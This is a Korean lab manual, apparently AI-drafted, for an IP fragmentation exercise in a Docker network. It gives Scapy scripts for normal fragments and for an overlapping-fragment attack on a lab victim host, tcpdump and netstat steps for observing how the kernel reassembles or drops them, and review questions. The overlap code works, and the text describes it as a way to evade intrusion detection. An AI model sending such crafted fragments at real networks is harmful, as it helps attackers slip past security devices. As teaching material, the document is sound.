# IP 단편화 기반 공격 실습 (IP-fragmentation-Attack Lab)

---

## 1. 실습 개요

### 1.1 실습 목표
본 실습의 목표는 다음과 같다.

- IP 단편화(Fragmentation)의 동작 원리 이해
- 운영체제(OS)의 자동 단편화 관찰
- 수동 단편(Manual Fragment) 생성 및 전송
- 재조립(Reassembly) 과정 분석
- Overlapping Fragment(겹치는 단편) 공격 실험
- 운영체제의 재조립 정책(허용/차단) 확인

### 1.2 실습 환경
#### 1.2.1 네트워크 구성
| 역할(Role) | IP 주소 |
|---|---|
| Attacker | 10.9.0.105 |
| Victim | 10.9.0.5 |
| Router | 10.9.0.11 |

- 네트워크 대역: `10.9.0.0/24`
- 캡처 지점: Host VM의 Docker Bridge(`br-xxxx`) 또는 Victim 컨테이너 `eth0`

#### 1.2.2 실습 파일/폴더 구조(권장)


Chap3/IP-fragmentation-Attack/
├─ README.md
├─ IP-fragmentation-Attack-lab.md
└─ lab-materials/
├─ manual_frag.py
├─ overlap_frag.py
└─ images/
├─ topology.png
├─ fragmentation-diagram.png
└─ overlap-diagram.png

## 2. 사전 점검(Pre-check)

### 2.1 컨테이너 실행 상태 확인
Host VM에서:

docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Networks}}"


* `attacker-10.9.0.105`, `victim-10.9.0.5`, `router` 등이 Up 상태인지 확인한다.

### 2.2 Victim 라우팅 확인

Host VM에서:


docker exec -it victim-10.9.0.5 ip route


* `default via ...` 및 `10.9.0.0/24` 경로가 존재하는지 확인한다.

### 2.3 Host VM의 Bridge 인터페이스 확인

Host VM에서:

```bash
ip -br addr | grep -E "br-|docker0"
```

* `10.9.0.1/24`(예시)와 같은 주소가 할당된 `br-xxxx`를 찾는다.
* 이후 tcpdump에서 해당 bridge 이름을 사용한다.

---

## 3. 실습 1: 자동 단편화(Automatic Fragmentation) 관찰

### 3.1 목표

운영체제가 MTU 제한으로 인해 **자동으로 단편화**를 수행하는 과정을 관찰하고,
Victim이 이를 **정상적으로 재조립**하는지 확인한다.

### 3.2 절차

#### 3.2.1 Victim에서 UDP 수신 대기

Host VM에서:

```bash
docker exec -it victim-10.9.0.5 bash
```

Victim 컨테이너에서:

```bash
nc -lu 9090
```

#### 3.2.2 Host VM에서 단편(Fragment) 패킷 캡처

Host VM(다른 터미널)에서:

```bash
sudo tcpdump -nn -vv -i br-xxxx 'ip[6:2] & 0x1fff != 0'
```

* `br-xxxx`는 2.3에서 확인한 bridge 이름으로 변경한다.
* 위 필터는 **fragment offset이 0이 아니거나**, 단편 관련 비트가 설정된 패킷을 잡기 위해 사용한다.

#### 3.2.3 Attacker에서 대용량 UDP 전송

Host VM에서:

```bash
docker exec -it attacker-10.9.0.105 python3 - <<'PY'
from scapy.all import *
send(IP(dst="10.9.0.5")/UDP(dport=9090)/("A"*4000), verbose=0)
print("Sent large UDP payload (4000 bytes)")
PY
```

### 3.3 관찰 포인트

* 동일한 IP ID가 반복되는지
* Fragment offset이 증가하는지
* MF(More Fragments) 플래그가 마지막 단편에서 0이 되는지
* Victim `nc`에 데이터가 도착하는지

---

## 4. 실습 2: 수동 단편화(Manual Fragmentation)

### 4.1 목표

Scapy로 **직접 IP 단편을 구성**하고, Victim에서 **정상 재조립**되는지 확인한다.

### 4.2 코드: `manual_frag.py`

`lab-materials/manual_frag.py`로 저장한다.

```python
from scapy.all import *

dst = "10.9.0.5"
ID  = 2222

# UDP payload 총 112 bytes
data1 = b"A" * 72
data2 = b"B" * 40

# UDP header(8) + payload(112) = 120
udp_len = 8 + len(data1) + len(data2)

# IPv4에서는 UDP checksum=0이면 "checksum 없음"으로 처리 가능
udp = UDP(sport=4444, dport=9090, len=udp_len, chksum=0)

# Fragment 1: IP payload = UDP header(8) + data1(72) = 80 bytes (8의 배수)
frag1 = IP(dst=dst, id=ID, flags="MF", frag=0) / udp / data1

# Fragment 2: offset=80 bytes => frag=10 (10*8=80), UDP header는 포함하지 않음
frag2 = IP(dst=dst, id=ID, flags=0, frag=10, proto=17) / data2

send(frag1, verbose=0)
send(frag2, verbose=0)

print("Manual fragments sent (ID=2222)")
```

### 4.3 실행

#### 4.3.1 Victim 수신기(권장: Python 수신기)

Victim 컨테이너에서:

```bash
python3 - <<'PY'
import socket, binascii
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 9090))
print("listening UDP/9090 ...")
while True:
    data, addr = s.recvfrom(65535)
    print("from", addr, "len", len(data))
    print(binascii.hexlify(data[:80]), b"..." if len(data)>80 else b"")
PY
```

#### 4.3.2 Attacker 전송

Host VM에서:

```bash
docker exec -it attacker-10.9.0.105 python3 /manual_frag.py
```

> 파일 위치가 `/manual_frag.py`가 아니라면, 컨테이너 내부 저장 경로에 맞게 변경한다.

### 4.4 기대 결과

* Victim에서 `len 112` 출력
* 앞부분은 `0x41`(A) 반복, 뒤쪽은 `0x42`(B) 반복

---

## 5. 실습 3: Overlapping Fragment(겹치는 단편) 공격

### 5.1 목표

두 번째 단편의 offset을 조작하여 **첫 번째 단편의 일부 영역과 겹치게(Overlap)** 만든 뒤,
운영체제가 이를 **재조립/차단**하는지 확인한다.

### 5.2 사전: 재조립 통계(Baseline) 확인

Victim 컨테이너에서:

```bash
netstat -s | egrep -i 'frag|reasm|reassembl|overlap'
```

* 실습 전/후 값을 비교하기 위해 현재 값을 기록한다.

### 5.3 코드: `overlap_frag.py`

`lab-materials/overlap_frag.py`로 저장한다.

> 아래 코드는 **두 번째 단편이 offset 72에서 시작**하도록 구성해 8바이트 overlap을 만든다.

```python
from scapy.all import *
import time

dst = "10.9.0.5"
ID  = 3333

# UDP payload 총 112 bytes
udp_len = 8 + 112
udp = UDP(sport=4444, dport=9090, len=udp_len, chksum=0)

# Fragment 1: UDP header(8) + data(72) = 80 bytes
frag1 = IP(dst=dst, id=ID, flags="MF", frag=0) / udp / (b"A" * 72)

# Fragment 2: offset=72 bytes => frag=9 (9*8=72)
# -> frag1(0~79)와 frag2(72~111)가 겹침(72~79) : 8 bytes overlap
frag2 = IP(dst=dst, id=ID, flags=0, frag=9, proto=17) / (b"B" * 40)

send(frag1, verbose=0)
time.sleep(0.2)
send(frag2, verbose=0)

print("Overlapping fragments sent (ID=3333)")
```

### 5.4 절차

#### 5.4.1 Victim에서 fragment 도착 확인(tcpdump)

Victim 컨테이너(새 터미널)에서:

```bash
tcpdump -nn -vv -i eth0 'ip and (ip[6:2] & 0x3fff != 0) and src host 10.9.0.105'
```

#### 5.4.2 Attacker에서 overlap 전송

Host VM에서:

```bash
docker exec -it attacker-10.9.0.105 python3 /overlap_frag.py
```

#### 5.4.3 Victim에서 재조립 통계(After) 확인

Victim 컨테이너에서:

```bash
netstat -s | egrep -i 'frag|reasm|reassembl|overlap'
```

### 5.5 결과 해석

#### 5.5.1 단편 범위(이번 실험 기준)

* Frag1: offset 0, IP payload 길이 80 bytes → 범위 `0 ~ 79`
* Frag2: offset 72, IP payload 길이 40 bytes → 범위 `72 ~ 111`
* Overlap 구간: `72 ~ 79` (8 bytes)

#### 5.5.2 커널 정책 판정(일반)

* `ReasmOverlaps` 증가 + `reassemblies failed` 증가 + UDP 수신 없음
  → overlap 감지 후 차단(drop/실패) 가능성이 큼
* `reassembled ok` 증가 + UDP 수신 존재
  → overlap을 허용하고 재조립함(환경에 따라 first-wins/last-wins 정책으로 갈림)

> 본 실습 환경(현대 Linux)에서는 overlap을 차단하는 경우가 흔하다.

---

## 6. 핵심 개념 정리

### 6.1 Fragment Offset

* 단위: 8 bytes
* 기준: IP payload(UDP header 포함) 기준 오프셋

### 6.2 MF(More Fragments)

* 1: 뒤에 단편 존재
* 0: 마지막 단편

### 6.3 Overlapping Fragment

* 서로 다른 단편이 **동일 데이터 영역을 덮어쓰도록** offset을 조작
* IDS/보안장비와 엔드호스트의 재조립 정책 차이를 악용해 우회 가능(고전적 회피 기법)

---

## 7. 확인 문제(학생용)

1. Fragment Offset이 8바이트 단위인 이유는 무엇인가?
2. 재조립(Reassembly)은 어느 계층에서 수행되는가?
3. Overlap이 발생하면 재조립 정책은 왜 문제가 되는가?
4. modern Linux는 왜 overlap을 차단하는 방향으로 진화했는가?
5. 단편 중 하나가 유실되면 어떤 일이 발생하는가?

---

## 8. 결론

본 실습을 통해 다음을 확인하였다.

* IP 단편화는 MTU 제한으로 인해 발생하며, 재조립은 수신 측 IP 계층에서 수행된다.
* 수동으로 단편을 조작하면 정상 재조립이 가능하다.
* Overlapping Fragment는 보안상 위험 요소이며, 현대 OS는 이를 감지하고 차단하는 경향이 있다.

```

---

원하시면, 위 문서에 **그림 삽입(이미지 파일명 기준)** 까지 넣어드릴까요?  
예: `lab-materials/images/topology.png`를 본문에 자동으로 참조하도록 섹션별로 `![...](...)` 링크를 배치해드릴 수 있습니다.
```
